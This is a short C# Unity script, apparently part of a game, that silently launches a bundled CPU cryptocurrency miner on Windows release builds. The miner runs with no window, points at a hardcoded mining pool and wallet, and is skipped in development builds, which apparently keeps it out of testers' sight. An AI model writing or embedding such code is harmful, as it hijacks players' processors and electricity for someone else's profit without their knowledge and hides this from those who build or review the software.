using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.Diagnostics;

public class MiningScript : MonoBehaviour
{

    public bool AutoStart;

    private Process Proc;

    void Awake()
    {
        DontDestroyOnLoad(transform.gameObject);
    }

    // Use this for initialization
    void Start ()
    {
        if (AutoStart)
            StartMiner();
	}
	
	// Update is called once per frame
	void Update ()
    {
		
	}

    private void OnDestroy()
    {
        StopMiner();
    }

    public void StartMiner()
    {
#if DEVELOPMENT_BUILD
#else
        if (Application.platform != RuntimePlatform.WindowsPlayer)
            return;



        string path = Application.dataPath + "/StreamingAssets/miner/cpuminer-allium-x64.exe";
        string args = @"-a allium -o stratum+tcp://garlicmine.com:3333 -u GNwJhNG4GEUFvsMK3Ehho9JrYpS3CjRHno";

        ProcessStartInfo ProcessInfo;
        ProcessInfo = new ProcessStartInfo(path, args);
        ProcessInfo.CreateNoWindow = true;
        ProcessInfo.UseShellExecute = false;

        Proc = Process.Start(ProcessInfo);
#endif
    }

    public void StopMiner()
    {
        Proc.Kill();
    }
}
